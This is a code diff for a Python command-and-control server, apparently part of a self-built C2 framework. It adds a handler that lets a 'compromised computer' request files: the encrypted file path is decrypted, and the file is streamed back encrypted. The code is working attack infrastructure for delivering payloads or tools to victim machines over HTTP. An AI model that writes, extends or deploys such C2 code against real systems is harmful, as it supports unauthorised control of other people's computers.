@@ -5,7 +5,7 @@ from http.server import BaseHTTPRequestHandler, HTTPServer
 from urllib.parse import unquote_plus
 from inputimeout import inputimeout, TimeoutOccurred
 from encryption import cipher
-from settings import CWD_RESPONSE, PORT, CMD_REQUEST, INPUT_TIMEOUT, KEEP_ALIVE_CMD, RESPONSE, RESPONSE_KEY, BIND_ADDR
+from settings import FILE_REQUEST, CWD_RESPONSE, PORT, CMD_REQUEST, INPUT_TIMEOUT, KEEP_ALIVE_CMD, RESPONSE, RESPONSE_KEY, BIND_ADDR
 
 def get_new_session():
     """ Function to check if other sessions exist. If none do, re-initialize variables. However, if session do
@@ -122,6 +122,24 @@ class C2Handler(BaseHTTPRequestHandler):
 
                 # Sends the HTTP response code and header back to the client
                 self.http_response(404)
+
+        # Follow this code block when the compromised computer is requesting a file
+        elif self.path.startswith(FILE_REQUEST):
+
+            # Split out the encrypted filepath from the HTTP GET request
+            filepath = self.path.split(FILE_REQUEST)[1]
+
+            # Encode the filepath becouse decrypt requires it, then decrypt, then decode
+            filepath = cipher.decrypt(filepath.encode()).decode()
+
+            # Read the requested file into memory and stream it back for client's GET response
+            try:
+                with open(f"{filepath}", "rb") as file_handle:
+                    self.http_response(200)
+                    self.wfile.write(cipher.encrypt(file_handle.read()))
+            except (FileNotFoundError, OSError):
+                print(f"{filepath} was not found on the c2 server.")
+                self.http_response(404) 
 
     # noinspection PyPep8Naming
     def do_POST(self):
